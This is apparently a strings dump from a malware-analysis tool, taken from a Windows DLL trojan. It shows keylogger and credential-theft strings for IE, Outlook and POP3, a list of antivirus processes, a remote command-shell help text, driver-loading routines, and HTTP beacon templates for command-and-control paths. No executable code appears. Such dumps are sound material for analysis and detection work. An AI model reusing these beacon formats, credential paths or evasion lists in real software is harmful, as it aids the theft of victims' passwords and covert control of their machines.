[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x000000cf 0x000000cf 4   6            utf8    \r+ń\r blocks=Basic Latin,Latin Extended-A
2    0x00000117 0x00000117 5   6            ascii   \rRich
3    0x00000230 0x00000230 5   6            ascii   .text
4    0x00000257 0x00000257 7   8            ascii   `.rdata
5    0x0000027f 0x0000027f 6   7            ascii   @.data
6    0x000002a8 0x000002a8 4   5            ascii   poly
7    0x000002d0 0x000002d0 5   6            ascii   .rsrc
8    0x000002f7 0x000002f7 7   8            ascii   @.reloc
715  0x00014ab0 0x10016cb0 4   5    poly    ascii   Y_^[
716  0x00014ad3 0x10016cd3 4   5    poly    ascii   \fSVW
717  0x00014aec 0x10016cec 5   7    poly    utf8    u\b3ۉ] blocks=Basic Latin,Arabic
718  0x00014b0c 0x10016d0c 4   5    poly    ascii   E\fPh
719  0x00014c5b 0x10016e5b 4   6    poly    utf8    3ۉ]\f blocks=Basic Latin,Arabic
720  0x00014c69 0x10016e69 4   5    poly    ascii   U\fRh
721  0x00014cc3 0x10016ec3 5   8    poly    utf8    Ëu\b3ۍ blocks=Latin-1 Supplement,Basic Latin,Arabic
722  0x00014cdd 0x10016edd 6   7    poly    ascii   y\fjHSW
723  0x00014e1d 0x1001701d 4   5    poly    ascii   Y_^[
724  0x00014e79 0x10017079 4   5    poly    ascii   E\bPh
725  0x000150a5 0x100172a5 4   5    poly    ascii   M\bQh
726  0x000150d7 0x100172d7 6   7    poly    ascii   y\fjHWS
727  0x000151df 0x100173df 4   5    poly    ascii   Y_^[
728  0x00015230 0x10017430 4   5    poly    ascii   C(Ph
729  0x000152c4 0x100174c4 5   7    poly    utf8    ;C$rɋ blocks=Basic Latin,Latin Extended-B
730  0x00015691 0x10017891 5   6    poly    ascii   E\bSVW
731  0x00015697 0x10017897 4   7    poly    utf8    ډEЉM blocks=Arabic,Basic Latin,Cyrillic
732  0x000156fb 0x100178fb 4   5    poly    ascii   t\fVj
733  0x00015819 0x10017a19 5   8    poly    utf8    UԋE؉S blocks=Basic Latin,Cyrillic Supplement,Arabic
734  0x000158ce 0x10017ace 4   5    poly    ascii   V\fSR
735  0x000158f4 0x10017af4 5   8    poly    utf8    EЋỦ0 blocks=Basic Latin,Cyrillic,Combining Diacritical Marks
736  0x0001597e 0x10017b7e 4   5    poly    ascii   K\nVQ
737  0x000159d3 0x10017bd3 4   5    poly    ascii   \bSVW
738  0x00015acf 0x10017ccf 4   5    poly    ascii   Y_^[
739  0x00015af0 0x10017cf0 4   5    poly    ascii   PSVW
740  0x00015b4f 0x10017d4f 5   8    poly    utf8    VTWR蘜 blocks=Basic Latin,CJK Unified Ideographs
741  0x00015b6e 0x10017d6e 4   5    poly    ascii   Y_^[
742  0x00015c27 0x10017e27 5   8    poly    utf8    3ۉ]܉] blocks=Basic Latin,Arabic,Syriac
743  0x0001603a 0x1001823a 4   5    poly    ascii   Y_^[
744  0x00016202 0x10018402 5   6    poly    ascii   N\bQh(
745  0x00016303 0x10018503 4   5    poly    ascii   WWWW
746  0x0001643e 0x1001863e 4   9    poly    utf16le jjjj
747  0x00016453 0x10018653 4   5    poly    ascii   QGWh
748  0x00016508 0x10018708 5   7    poly    utf8    \fjf3ۍ blocks=Basic Latin,Arabic
749  0x000165b6 0x100187b6 4   5    poly    ascii   \fjzS
750  0x000169be 0x10018bbe 5   6    poly    ascii   \VWt!
751  0x00016a2b 0x10018c2b 4   5    poly    ascii   u+j2
752  0x00016a7f 0x10018c7f 4   5    poly    ascii   PSVW
753  0x00016ade 0x10018cde 5   7    poly    utf8    t\eVh̨ blocks=Basic Latin,Combining Diacritical Marks
754  0x00016b32 0x10018d32 4   5    poly    ascii   t#Wj
755  0x00016b3e 0x10018d3e 5   6    poly    ascii   E\fWPV
756  0x00016e75 0x10019075 4   6    poly    utf8    ]ÍwT blocks=Basic Latin,Latin-1 Supplement
757  0x00016e82 0x10019082 4   5    poly    ascii   t.VS
758  0x00016eb8 0x100190b8 4   6    poly    utf8    OuŋE blocks=Basic Latin,Latin Extended-A
759  0x00016f32 0x10019132 4   5    poly    ascii   Ht(H
760  0x00016f5b 0x1001915b 4   6    poly    utf8    ]ÍwT blocks=Basic Latin,Latin-1 Supplement
761  0x00016f6c 0x1001916c 4   5    poly    ascii   K\bQV
762  0x00017205 0x10019405 4   5    poly    ascii   ,SVW
763  0x0001720c 0x1001940c 4   5    poly    ascii   Ph@%
764  0x00017288 0x10019488 4   5    poly    ascii   Rh@$
765  0x0001730c 0x1001950c 4   5    poly    ascii   U\bRj
766  0x00017329 0x10019529 4   5    poly    ascii   RhP%
767  0x00017365 0x10019565 4   5    poly    ascii   $SVW
768  0x0001736c 0x1001956c 4   5    poly    ascii   Ph@%
769  0x000173db 0x100195db 6   7    poly    ascii   U\fRh@$
770  0x0001745b 0x1001965b 4   5    poly    ascii   U\bRj
771  0x00017497 0x10019697 4   5    poly    ascii   PhP%
772  0x000174d9 0x100196d9 4   5    poly    ascii   U\bRP
773  0x000175af 0x100197af 5   7    poly    utf8    ̋F\fW3 blocks=Combining Diacritical Marks,Basic Latin
774  0x000175fb 0x100197fb 4   5    poly    ascii   Vhp%
775  0x0001761a 0x1001981a 6   7    poly    ascii   {\bWh`%
776  0x0001776d 0x1001996d 4   5    poly    ascii   u\f_[
777  0x0001777d 0x1001997d 4   6    poly    utf8    t\r3ۋ blocks=Basic Latin,Arabic
778  0x000177c9 0x100199c9 6   7    poly    ascii   t6Hu3V
779  0x00017840 0x10019a40 4   5    poly    ascii   SVWP
780  0x00017c40 0x10019e40 4   5    poly    ascii   QSWV
781  0x00017c63 0x10019e63 4   5    poly    ascii   RSWV
782  0x00017db6 0x10019fb6 4   5    poly    ascii   Y_^[
783  0x00017e11 0x1001a011 4   5    poly    ascii   QSSh
784  0x00017e8d 0x1001a08d 4   5    poly    ascii   QShx
785  0x000182a2 0x1001a4a2 5   7    poly    utf8    YËT$\b blocks=Basic Latin,Latin-1 Supplement
786  0x00018370 0x1001a570 5   7    poly    utf8    YËT$\b blocks=Basic Latin,Latin-1 Supplement
787  0x000183c9 0x1001a5c9 5   7    poly    utf8    YËT$\b blocks=Basic Latin,Latin-1 Supplement
788  0x00018447 0x1001a647 5   7    poly    utf8    YËT$\b blocks=Basic Latin,Latin-1 Supplement
789  0x000184e6 0x1001a6e6 5   7    poly    utf8    YËT$\b blocks=Basic Latin,Latin-1 Supplement
790  0x0001852a 0x1001a72a 5   7    poly    utf8    YËT$\b blocks=Basic Latin,Latin-1 Supplement
791  0x000185b0 0x1001a7b0 12  26   poly    utf16le FriendlyName
792  0x000185d4 0x1001a7d4 6   7    poly    ascii   system
793  0x000185dc 0x1001a7dc 12  26   poly    utf16le explorer.exe
794  0x00018600 0x1001a800 17  36   poly    utf16le mp\ziptmp$1.tmp21
795  0x00018624 0x1001a824 6   14   poly    utf16le pstore
796  0x00018634 0x1001a834 6   14   poly    utf16le keylog
797  0x00018644 0x1001a844 4   10   poly    utf16le info
798  0x00018650 0x1001a850 61  124  poly    utf16le \n\nKeylog %d chars\n------------------------------------------\n
799  0x000186d4 0x1001a8d4 6   14   poly    utf16le \nEnd\n\n
800  0x000186e4 0x1001a8e4 12  26   poly    utf16le \n\nIE Ver %f\n
801  0x00018700 0x1001a900 65  132  poly    utf16le \n\nIE account %d found\n------------------------------------------\n
802  0x00018784 0x1001a984 16  34   poly    utf16le %s: %s, %s / %S\n
803  0x000187a8 0x1001a9a8 48  98   poly    utf16le \n\n%S\n------------------------------------------\n
804  0x0001880c 0x1001aa0c 4   5    poly    ascii   %02X
805  0x00018814 0x1001aa14 5   6    poly    ascii   %02X:
806  0x0001881c 0x1001aa1c 4   5    poly    ascii   , %s
807  0x00018828 0x1001aa28 23  48   poly    utf16le %S, %s\n     %S\n     %S\n
808  0x00018858 0x1001aa58 36  74   poly    utf16le SOFTWARE\Microsoft\Internet Explorer
809  0x000188a4 0x1001aaa4 7   16   poly    utf16le Version
810  0x000188b4 0x1001aab4 9   20   poly    utf16le \nIE : %s\n
811  0x000188c8 0x1001aac8 60  122  poly    utf16le \Software\Microsoft\Windows\CurrentVersion\Internet Settings
812  0x00018944 0x1001ab44 11  24   poly    utf16le ProxyServer
813  0x0001895c 0x1001ab5c 15  32   poly    utf16le      Proxy: %s\n
814  0x00018984 0x1001ab84 12  26   poly    utf16le Navapsvc.exe
815  0x000189a0 0x1001aba0 12  26   poly    utf16le ccSvcHst.exe
816  0x000189c4 0x1001abc4 10  22   poly    utf16le KAVsvc.exe
817  0x000189e4 0x1001abe4 11  24   poly    utf16le RAVmonD.exe
818  0x00018a04 0x1001ac04 17  36   poly    utf16le zhudongfangyu.exe
819  0x00018a30 0x1001ac30 7   16   poly    utf16le avp.exe
820  0x00018a40 0x1001ac40 5   12   poly    utf16le Trend
821  0x00018a4c 0x1001ac4c 9   20   poly    utf16le TmPfw.exe
822  0x00018a60 0x1001ac60 5   12   poly    utf16le NOD32
823  0x00018a6c 0x1001ac6c 8   18   poly    utf16le ekrn.exe
824  0x00018a88 0x1001ac88 11  24   poly    utf16le avguard.exe
825  0x00018aa0 0x1001aca0 4   10   poly    utf16le , %s
826  0x00018ab4 0x1001acb4 8   18   poly    utf16le \nAV: %s\n
827  0x00018ad8 0x1001acd8 6   14   poly    utf16le VdoSrc
828  0x00018ae8 0x1001ace8 6   14   poly    utf16le AVIDec
829  0x00018af8 0x1001acf8 8   18   poly    utf16le MJPEGEnc
830  0x00018b0c 0x1001ad0c 4   10   poly    utf16le Samp
831  0x00018b18 0x1001ad18 4   10   poly    utf16le NulR
832  0x00018b24 0x1001ad24 21  44   poly    utf16le WM Speech Encoder DMO
833  0x00018b78 0x1001ad78 7   16   poly    utf16le cmd.exe
834  0x00018b90 0x1001ad90 32  66   poly    utf16le \n<<< Extend command exited >>>\n\n
835  0x00018bd4 0x1001add4 12  26   poly    utf16le Bad command\n
836  0x00018bf0 0x1001adf0 4   10   poly    utf16le help
837  0x00018c2c 0x1001ae2c 4   10   poly    utf16le copy
838  0x00018c48 0x1001ae48 4   10   poly    utf16le type
839  0x00018c54 0x1001ae54 5   12   poly    utf16le start
840  0x00018c70 0x1001ae70 6   14   poly    utf16le %c:%s\n
841  0x00018c80 0x1001ae80 97  196  poly    utf16le Internal Cmd v1.1,  help\n\ncd\ndir\nmd\nrd\ndel\ncopy\nren\ntype\nstart     -  Run program in background\n\n
842  0x00018d44 0x1001af44 4   10   poly    utf16le \*.*
843  0x00018d50 0x1001af50 12  26   poly    utf16le %s\n--------\n
844  0x00018d6c 0x1001af6c 4   10   poly    utf16le %-8d
845  0x00018d78 0x1001af78 4   20   poly    utf32le ARSH
846  0x00018d98 0x1001af98 49  100  poly    utf16le %-26s %-6s  %-12s  %04d-%02d-%02d %02d:%02d:%02d\n
847  0x00018e20 0x1001b020 4   5    poly    ascii   %c:\
848  0x00018e34 0x1001b034 5   6    poly    ascii   SHARE
849  0x00018e44 0x1001b044 4   10   poly    utf16le %c:\
850  0x00018e5c 0x1001b05c 11  24   poly    utf16le c:\windows\
851  0x00018e74 0x1001b074 26  27   poly    ascii   abcdefghijklmnopqrstuvwxyz
852  0x00018e90 0x1001b090 69  70   poly    ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s:%s
853  0x00018ed8 0x1001b0d8 162 163  poly    ascii   CONNECT %s:%d HTTP/1.1\r\nHOST: %s:%d\r\nContent-Length: 0\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nPragma: no-cache\r\nProxy-Authorization: Basic %s\r\n\r\n
854  0x00018f80 0x1001b180 131 132  poly    ascii   CONNECT %s:%d HTTP/1.1\r\nHOST: %s:%d\r\nContent-Length: 0\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nPragma: no-cache\r\n\r\n
855  0x00019004 0x1001b204 12  13   poly    ascii   HTTP/1.0 407
856  0x00019014 0x1001b214 12  13   poly    ascii   HTTP/1.1 407
857  0x00019024 0x1001b224 12  13   poly    ascii   HTTP/1.0 200
858  0x00019034 0x1001b234 12  13   poly    ascii   HTTP/1.1 200
859  0x00019048 0x1001b248 145 146  poly    ascii   POST /photos/photo.asp HTTP/1.1\r\nHOST: %s:%d\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\nPragma: no-cache\r\n\r\n
860  0x000190dc 0x1001b2dc 17  18   poly    ascii   Connection: Close
861  0x000190f0 0x1001b2f0 121 122  poly    ascii   POST /photos/photo.asp HTTP/1.1\r\nHOST: %s:%d\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nPragma: no-cache\r\n\r\n
862  0x0001916c 0x1001b36c 33  34   poly    ascii   POST /photos/photo.asp HTTP/1.1\r\n
863  0x00019190 0x1001b390 5   6    poly    ascii   Via: 
864  0x00019198 0x1001b398 125 126  poly    ascii   HTTP/1.0 200\r\nServer: Apache/2.2.3 (Red Hat)\r\nAccept-Ranges: bytes\r\nContent-Type: text/html\r\nProxy-Connection: keep-alive\r\n\r\n
865  0x00019218 0x1001b418 80  81   poly    ascii   HTTP/1.0 400  Bad Request\r\nServer: Apache/2.2.3 (Red Hat)\r\nConnection: close\r\n\r\n
866  0x0001926c 0x1001b46c 40  41   poly    ascii   GET /Query.asp?loginid=112037 HTTP/1.1\r\n
867  0x00019298 0x1001b498 183 184  poly    ascii   HTTP/1.1 200 OK\r\nServer: Apache 1.3.19\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nExpires: 0\r\nConnection: Keep-Alive\r\nContent-Type: application/x-octet-stream\r\nContent-Length: %d\r\n\r\n
868  0x00019350 0x1001b550 180 181  poly    ascii   HTTP/1.1 200 OK\r\nServer: Apache 1.3.19\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nExpires: 0\r\nConnection: Keep-Alive\r\nContent-Type: application/octet-stream\r\nContent-Length: 0\r\n\r\n
869  0x00019408 0x1001b608 35  36   poly    ascii   POST /Catelog/login1.asp HTTP/1.1\r\n
870  0x00019430 0x1001b630 16  17   poly    ascii   Content-Length: 
871  0x00019444 0x1001b644 15  16   poly    ascii   HTTP/1.1 200 OK
872  0x00019454 0x1001b654 15  16   poly    ascii   HTTP/1.0 200 OK
873  0x00019468 0x1001b668 243 244  poly    ascii   POST /Catelog/login1.asp HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\nContent-Type: application/x-octet-stream\r\nContent-Length: %d\r\n\r\n
874  0x00019560 0x1001b760 186 187  poly    ascii   GET /Query.asp?loginid=112037 HTTP/1.1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nHost: %s:%d\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\n\r\n
875  0x000196a0 0x1001b8a0 17  36   poly    utf16le HKEY_CLASSES_ROOT
876  0x000196c4 0x1001b8c4 17  36   poly    utf16le HKEY_CURRENT_USER
877  0x000196e8 0x1001b8e8 18  38   poly    utf16le HKEY_LOCAL_MACHINE
878  0x00019710 0x1001b910 10  22   poly    utf16le HKEY_USERS
879  0x00019728 0x1001b928 19  40   poly    utf16le HKEY_CURRENT_CONFIG
880  0x00019750 0x1001b950 18  19   poly    ascii   CreateCompatibleDC
881  0x00019764 0x1001b964 5   6    poly    ascii   gdi32
882  0x0001976c 0x1001b96c 8   9    poly    ascii   DeleteDC
883  0x00019778 0x1001b978 7   8    poly    ascii   WinSta0
884  0x00019780 0x1001b980 11  12   poly    ascii   pstorec.dll
885  0x0001978c 0x1001b98c 20  21   poly    ascii   PStoreCreateInstance
886  0x000197a4 0x1001b9a4 7   16   poly    utf16le Outlook
887  0x000197b4 0x1001b9b4 52  53   poly    ascii   Software\Microsoft\Internet Account Manager\Accounts
888  0x000197ec 0x1001b9ec 18  38   poly    utf16le HTTPMail Password2
889  0x00019814 0x1001ba14 18  38   poly    utf16le HTTPMail User Name
890  0x0001983c 0x1001ba3c 14  30   poly    utf16le POP3 Password2
891  0x0001985c 0x1001ba5c 14  30   poly    utf16le POP3 User Name
892  0x0001988c 0x1001ba8c 36  37   poly    ascii   abe2869f-9b47-4cd9-a358-c22904dba7f7
893  0x000198b4 0x1001bab4 18  38   poly    utf16le Microsoft_WinInet_
894  0x000198dc 0x1001badc 7   16   poly    utf16le WebAuth
895  0x000198ec 0x1001baec 7   8    poly    ascii   %s%2.2X
896  0x000198f4 0x1001baf4 58  59   poly    ascii   Software\Microsoft\Internet Explorer\IntelliForms\Storage2
897  0x00019930 0x1001bb30 7   16   poly    utf16le WebAuto
898  0x0001994f 0x1001bb4f 13  14   poly    ascii   kWtsapi32.dll
899  0x00019960 0x1001bb60 17  18   poly    ascii   WTSQueryUserToken
900  0x00019974 0x1001bb74 19  20   poly    ascii   GetNativeSystemInfo
901  0x00019988 0x1001bb88 12  13   poly    ascii   kernel32.dll
902  0x00019998 0x1001bb98 4   5    poly    ascii   Win7
903  0x000199a0 0x1001bba0 5   6    poly    ascii   Vista
904  0x000199a8 0x1001bba8 7   8    poly    ascii   Win2008
905  0x000199b0 0x1001bbb0 10  11   poly    ascii   Win2003 R2
906  0x000199bc 0x1001bbbc 9   10   poly    ascii   WinXP X64
907  0x000199c8 0x1001bbc8 7   8    poly    ascii   Win2003
908  0x000199d0 0x1001bbd0 5   6    poly    ascii   WinXP
909  0x000199d8 0x1001bbd8 7   8    poly    ascii   Win2000
910  0x000199e4 0x1001bbe4 11  12   poly    ascii   Workstation
911  0x000199f0 0x1001bbf0 4   5    poly    ascii   Home
912  0x000199f8 0x1001bbf8 12  13   poly    ascii   Professional
913  0x00019a08 0x1001bc08 22  23   poly    ascii   Datacenter for Itanium
914  0x00019a20 0x1001bc20 22  23   poly    ascii   Enterprise for Itanium
915  0x00019a38 0x1001bc38 14  15   poly    ascii   Datacenter x64
916  0x00019a48 0x1001bc48 14  15   poly    ascii   Enterprise x64
917  0x00019a58 0x1001bc58 12  13   poly    ascii   Standard x64
918  0x00019a68 0x1001bc68 10  11   poly    ascii   Datacenter
919  0x00019a74 0x1001bc74 10  11   poly    ascii   Enterprise
920  0x00019a80 0x1001bc80 8   9    poly    ascii   Standard
921  0x00019a8c 0x1001bc8c 8   9    poly    ascii   Advanced
922  0x00019a98 0x1001bc98 6   7    poly    ascii   Server
923  0x00019aa0 0x1001bca0 9   10   poly    ascii   SP%s (%d)
924  0x00019aac 0x1001bcac 5   6    poly    ascii   Win95
925  0x00019ab4 0x1001bcb4 10  11   poly    ascii   Win95 OSR2
926  0x00019ac0 0x1001bcc0 5   6    poly    ascii   Win98
927  0x00019ac8 0x1001bcc8 8   9    poly    ascii   Win98 SE
928  0x00019ad4 0x1001bcd4 5   6    poly    ascii   WinMe
929  0x00019adc 0x1001bcdc 6   7    poly    ascii   Win32s
930  0x00019ae4 0x1001bce4 8   9    poly    ascii   %s %s %s
931  0x00019af0 0x1001bcf0 4   5    poly    ascii   Type
932  0x00019af8 0x1001bcf8 12  13   poly    ascii   ErrorControl
933  0x00019b08 0x1001bd08 5   6    poly    ascii   Start
934  0x00019b10 0x1001bd10 11  12   poly    ascii   DisplayName
935  0x00019b1c 0x1001bd1c 11  12   poly    ascii   LocalSystem
936  0x00019b28 0x1001bd28 10  11   poly    ascii   ObjectName
937  0x00019b34 0x1001bd34 9   10   poly    ascii   ImagePath
938  0x00019b40 0x1001bd40 14  15   poly    ascii   ZwUnloadDriver
939  0x00019b50 0x1001bd50 9   10   poly    ascii   ntdll.dll
940  0x00019b5c 0x1001bd5c 9   20   poly    utf16le \Drivers\
941  0x00019b70 0x1001bd70 4   10   poly    utf16le .sys
942  0x00019b7c 0x1001bd7c 6   14   poly    utf16le \??\%s
943  0x00019b8c 0x1001bd8c 10  22   poly    utf16le \Device\%s
944  0x00019ba8 0x1001bda8 34  70   poly    utf16le System\CurrentControlSet\Services\
945  0x00019bf0 0x1001bdf0 52  106  poly    utf16le \Registry\Machine\System\CurrentControlSet\Services\
946  0x00019c5c 0x1001be5c 12  13   poly    ascii   ZwLoadDriver
947  0x00019c70 0x1001be70 33  68   poly    utf16le System\CurrentControlSet\Services
948  0x00019cb4 0x1001beb4 9   20   poly    utf16le ImagePath
949  0x00019cc8 0x1001bec8 21  22   poly    ascii   SeLoadDriverPrivilege
950  0x00019ce0 0x1001bee0 12  26   poly    utf16le vstskmgr.exe
951  0x00019cfc 0x1001befc 12  26   poly    utf16le mcshield.exe
952  0x00019d18 0x1001bf18 4   5    poly    ascii   2.03
953  0x00019d73 0x1001bf73 4   5    poly    ascii   3jAM
954  0x00019d78 0x1001bf78 4   5    poly    ascii   KMEq
955  0x00019dae 0x1001bfae 4   6    poly    utf8    D=\aĨ blocks=Basic Latin,Latin Extended-A
956  0x00019e5e 0x1001c05e 7   8    poly    ascii   D=juD=j
957  0x0001a142 0x1001c342 4   5    poly    ascii   f<jx
958  0x0001a148 0x1001c348 5   6    poly    ascii   :\nQ1Z
959  0x0001a164 0x1001c364 5   6    poly    ascii   :JG=u
960  0x0001a16e 0x1001c36e 4   5    poly    ascii   E=<2
961  0x0001a182 0x1001c382 4   5    poly    ascii   t<jp
962  0x0001a187 0x1001c387 4   5    poly    ascii   Ay\nq
963  0x0001a192 0x1001c392 8   9    poly    ascii   t<jME=j5
964  0x0001a19e 0x1001c39e 5   8    poly    utf8    .<簤m= blocks=Basic Latin,CJK Unified Ideographs
965  0x0001a1b2 0x1001c3b2 4   5    poly    ascii   D=jp
966  0x0001a1b9 0x1001c3b9 4   6    poly    utf8    Ƅb4< blocks=Latin Extended-B,Basic Latin
967  0x0001a1e9 0x1001c3e9 8   9    poly    ascii   ~I=jVD}k
968  0x0001a209 0x1001c409 4   5    poly    ascii   T@}k
969  0x0001a246 0x1001c446 4   5    poly    ascii   t<jq
970  0x0001a24e 0x1001c44e 5   6    poly    ascii   F=j~\a
971  0x0001a28e 0x1001c48e 4   7    poly    utf8    D=ᰤV blocks=Basic Latin,Lepcha
972  0x0001a2c5 0x1001c4c5 4   6    poly    utf8    ΏJl3 blocks=Greek and Coptic,Basic Latin
973  0x0001a2d5 0x1001c4d5 6   8    poly    utf8    οJgt<1 blocks=Greek and Coptic,Basic Latin
974  0x0001a325 0x1001c525 4   7    poly    utf8    ~\t-㸌 blocks=Basic Latin,CJK Unified Ideographs Extension A
975  0x0001a33d 0x1001c53d 5   6    poly    ascii   :E=jt
976  0x0001a349 0x1001c549 7   9    poly    utf8    'D=jƖWr blocks=Basic Latin,Latin Extended-B
977  0x0001a361 0x1001c561 4   5    poly    ascii   }W=j
978  0x0001a3ed 0x1001c5ed 4   5    poly    ascii   1HWl
979  0x0001a44a 0x1001c64a 4   7    poly    utf8    D=ᰜT blocks=Basic Latin,Lepcha
980  0x0001a451 0x1001c651 6   7    poly    ascii   ]D=j~\t
981  0x0001a467 0x1001c667 4   5    poly    ascii   5a?K
982  0x0001a484 0x1001c684 4   5    poly    ascii   Q>3;
983  0x0001a49e 0x1001c69e 4   5    poly    ascii   EHn3
984  0x0001a4b1 0x1001c6b1 4   5    poly    ascii   |\t-S
985  0x0001a4bc 0x1001c6bc 4   5    poly    ascii   '-\rT
986  0x0001a4c1 0x1001c6c1 4   5    poly    ascii   ]D=j
987  0x0001a4f7 0x1001c6f7 4   5    poly    ascii   pz|\t
988  0x0001a5ae 0x1001c7ae 6   7    poly    ascii   O=j7H=
989  0x0001a5d2 0x1001c7d2 4   5    poly    ascii   E=ep
990  0x0001a5ee 0x1001c7ee 4   7    poly    utf8    D=㰸H blocks=Basic Latin,CJK Unified Ideographs Extension A
991  0x0001a5f5 0x1001c7f5 4   5    poly    ascii   t<5j
992  0x0001a626 0x1001c826 5   6    poly    ascii   \Wj\nQ
993  0x0001a643 0x1001c843 5   6    poly    ascii   }z|\a9
994  0x0001a64f 0x1001c84f 5   6    poly    ascii   {J|\a1
995  0x0001a677 0x1001c877 4   5    poly    ascii   Hb\nQ
996  0x0001a697 0x1001c897 5   6    poly    ascii   @f~3]
997  0x0001a6aa 0x1001c8aa 4   5    poly    ascii   \=ey
998  0x0001a6b3 0x1001c8b3 5   6    poly    ascii   BV\n3%
999  0x0001a6ee 0x1001c8ee 5   6    poly    ascii   t<jv!
1000 0x0001a75f 0x1001c95f 4   5    poly    ascii   rR\n\t
1001 0x0001a7b1 0x1001c9b1 4   5    poly    ascii   }\n>Y
1002 0x0001a7d2 0x1001c9d2 5   6    poly    ascii   17Q39
1003 0x0001a7f3 0x1001c9f3 6   7    poly    ascii   B\nu\v>k
1004 0x0001a802 0x1001ca02 4   5    poly    ascii   t<j~
1005 0x0001a81b 0x1001ca1b 5   6    poly    ascii   1<~4]
1006 0x0001a826 0x1001ca26 7   8    poly    ascii   DH;v:5V
1007 0x0001a836 0x1001ca36 5   6    poly    ascii   \Wj\nQ
1008 0x0001a85f 0x1001ca5f 4   5    poly    ascii   ~z\nQ
1009 0x0001a872 0x1001ca72 4   5    poly    ascii   Q<j|
1010 0x0001a8a4 0x1001caa4 4   9    poly    utf8    簸m簼m blocks=CJK Unified Ideographs,Basic Latin
1011 0x0001a8d1 0x1001cad1 5   6    poly    ascii   i\a<jv
1012 0x0001a8e2 0x1001cae2 5   6    poly    ascii   P<jrL
1013 0x0001a8ee 0x1001caee 4   5    poly    ascii   g<jx
1014 0x0001a8fd 0x1001cafd 4   5    poly    ascii   m\a<j
1015 0x0001a94c 0x1001cb4c 6   7    poly    ascii   gi\a<jv
1016 0x0001a960 0x1001cb60 6   7    poly    ascii   gm\a<jv
1017 0x0001a97e 0x1001cb7e 4   5    poly    ascii   E=Y0
1018 0x0001a996 0x1001cb96 4   5    poly    ascii   D=O\n
1019 0x0001a9a1 0x1001cba1 6   7    poly    ascii   \rIHfKL
1020 0x0001a9d1 0x1001cbd1 5   6    poly    ascii   \rgHmK
1021 0x0001a9dd 0x1001cbdd 5   6    poly    ascii   \raHc2
1022 0x0001a9f9 0x1001cbf9 5   6    poly    ascii   \rbHc2
1023 0x0001aa15 0x1001cc15 5   6    poly    ascii   \rjHmK
1024 0x0001aa21 0x1001cc21 5   6    poly    ascii   \riHyK
1025 0x0001aa64 0x1001cc64 5   6    poly    ascii   :\nQ1Z
1026 0x0001aa72 0x1001cc72 4   5    poly    ascii   .>=x
1027 0x0001aacd 0x1001cccd 4   5    poly    ascii   \nQqZ
1028 0x0001aadc 0x1001ccdc 5   7    poly    utf8    'iϰ6\n blocks=Basic Latin,Greek and Coptic
1029 0x0001aaea 0x1001ccea 4   5    poly    ascii   JWbx
1030 0x0001ab0c 0x1001cd0c 7   8    poly    ascii   o\r\a<j~\t
1031 0x0001ab2a 0x1001cd2a 7   8    poly    ascii   y=,6gK@
1032 0x0001ab45 0x1001cd45 5   6    poly    ascii   ;D=j\n
1033 0x0001ab62 0x1001cd62 5   6    poly    ascii   L}P>1
1034 0x0001ab6c 0x1001cd6c 4   5    poly    ascii   Q6:7
1035 0x0001abb2 0x1001cdb2 7   8    poly    ascii   TWj\nQ]Z
1036 0x0001abd6 0x1001cdd6 6   7    poly    ascii   E=77@=
1037 0x0001ac00 0x1001ce00 5   6    poly    ascii   ^0N}k
1038 0x0001ac06 0x1001ce06 4   5    poly    ascii   06*v
1039 0x0001ac14 0x1001ce14 5   6    poly    ascii   ~0H}k
1040 0x0001ac35 0x1001ce35 4   5    poly    ascii   %D=j
